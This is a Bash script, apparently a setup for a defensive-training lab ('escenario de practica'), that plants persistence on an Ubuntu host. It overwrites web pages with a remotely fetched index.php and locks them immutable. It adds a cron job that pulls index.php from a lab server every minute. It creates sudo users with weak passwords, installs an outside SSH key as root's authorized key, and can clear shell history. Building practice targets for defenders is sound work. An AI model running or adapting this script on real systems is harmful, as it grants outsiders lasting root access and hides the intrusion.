#!/usr/bin/env bash
set -Eeuo pipefail

# Redhavi: escenario de practica para Ubuntu.
WEB_REPO="https://github.com/banago/simple-php-website.git"
INDEX_URL="https://raw.githubusercontent.com/4rji/ccdc/main/index.php"
SSH_KEY_URL="https://raw.githubusercontent.com/4rji/4rji/main/id_ed25519.pub"
LAB_SERVER="10.5.8.11"

WEB_ROOT="/var/www/simple-php-website"
AUTH_FILE="/root/.ssh/authorized_keys"
CRON_LINE="* * * * * curl -o ${WEB_ROOT}/index.php http://${LAB_SERVER}/index.php"

PACKAGES=(
    nano
    curl
    git
    php
    libapache2-mod-php
    apache2
    cron
    e2fsprogs
)

log() {
    printf '[redhavi] %s\n' "$*"
}

warn() {
    printf '[redhavi][WARN] %s\n' "$*" >&2
}

die() {
    printf '[redhavi][ERROR] %s\n' "$*" >&2
    exit 1
}

require_root() {
    if [ "$(id -u)" -ne 0 ]; then
        die "Este script debe ejecutarse como root. Usa: sudo $0"
    fi
}

require_ubuntu() {
    if [ ! -r /etc/os-release ]; then
        die "No se pudo detectar el sistema operativo."
    fi

    # shellcheck disable=SC1091
    . /etc/os-release

    if [ "${ID:-}" != "ubuntu" ]; then
        die "Este script esta preparado para Ubuntu. Detectado: ${PRETTY_NAME:-desconocido}"
    fi
}

install_packages() {
    log "Instalando paquetes para Ubuntu..."
    apt-get update
    DEBIAN_FRONTEND=noninteractive apt-get install -y "${PACKAGES[@]}"
}

remove_immutable() {
    local file=$1

    if [ -e "$file" ] && command -v chattr >/dev/null 2>&1; then
        chattr -i "$file" 2>/dev/null || true
    fi
}

make_immutable() {
    local file=$1

    if command -v chattr >/dev/null 2>&1; then
        chattr +i "$file" || warn "No se pudo aplicar chattr +i a $file"
    else
        warn "chattr no esta disponible; $file no quedo inmutable"
    fi
}

download_file() {
    local url=$1
    local output=$2

    remove_immutable "$output"
    curl -fsSL -o "$output" "$url"
}

setup_web() {
    log "Preparando archivos web..."
    mkdir -p /var/www /var/www/html

    if [ -d "$WEB_ROOT/.git" ]; then
        log "Repositorio web existente, intentando actualizarlo..."
        git -C "$WEB_ROOT" pull --ff-only || warn "No se pudo actualizar $WEB_ROOT; continuo con el contenido actual"
    elif [ -d "$WEB_ROOT" ] && [ -n "$(find "$WEB_ROOT" -mindepth 1 -maxdepth 1 -print -quit)" ]; then
        warn "$WEB_ROOT ya existe y no es un repositorio git; no se clona encima"
    else
        git clone "$WEB_REPO" "$WEB_ROOT"
    fi

    download_file "$INDEX_URL" "$WEB_ROOT/index.php"
    download_file "$INDEX_URL" "/var/www/index.php"
    download_file "$INDEX_URL" "/var/www/html/index.php"

    make_immutable "$WEB_ROOT/index.php"
}

install_cron_job() {
    local tmp_cron

    log "Configurando cron sin duplicar entradas..."
    tmp_cron="$(mktemp)"
    crontab -l > "$tmp_cron" 2>/dev/null || true

    if grep -Fxq "$CRON_LINE" "$tmp_cron"; then
        log "La entrada de cron ya existe."
    else
        printf '%s\n' "$CRON_LINE" >> "$tmp_cron"
        crontab "$tmp_cron"
        log "Entrada de cron agregada."
    fi

    rm -f "$tmp_cron"
}

enable_apache() {
    log "Iniciando y habilitando apache2..."
    systemctl enable --now apache2
}

ensure_admin_group() {
    if ! getent group sudo >/dev/null 2>&1; then
        groupadd sudo
    fi
}

ensure_user() {
    local user=$1
    local password=$2
    local home_mode=$3

    if id "$user" >/dev/null 2>&1; then
        log "Usuario $user ya existe; asegurando grupo sudo y contrasena de practica."
        usermod -aG sudo "$user"
    else
        log "Creando usuario $user..."
        case "$home_mode" in
            with-home)
                useradd -m -G sudo "$user"
                ;;
            no-home)
                useradd -M -G sudo "$user"
                ;;
            *)
                die "Modo de home invalido para $user: $home_mode"
                ;;
        esac
    fi

    printf '%s:%s\n' "$user" "$password" | chpasswd
}

setup_users() {
    log "Configurando usuarios de practica..."
    ensure_admin_group

    ensure_user "ccdc" "ccdc" "with-home"
    passwd --expire ccdc

    ensure_user "splunk" "ass" "no-home"

    log "Usuarios configurados y agregados al grupo sudo."
}

setup_root_ssh_key() {
    log "Configurando llave SSH para root..."
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh

    download_file "$SSH_KEY_URL" "$AUTH_FILE"
    chmod 600 "$AUTH_FILE"
    make_immutable "$AUTH_FILE"

    log "Llave SSH publica instalada para root."
}

maybe_clear_history() {
    if [ "${REDHAVI_CLEAR_HISTORY:-0}" = "1" ]; then
        history -c 2>/dev/null || true
        history -w 2>/dev/null || true
        log "Historial borrado."
    else
        log "Historial no borrado. Usa REDHAVI_CLEAR_HISTORY=1 si quieres ese artefacto."
    fi
}

main() {
    require_root
    require_ubuntu
    install_packages
    setup_web
    install_cron_job
    enable_apache
    setup_users
    setup_root_ssh_key
    maybe_clear_history

    log "Escenario redhavi terminado."
}

main "$@"
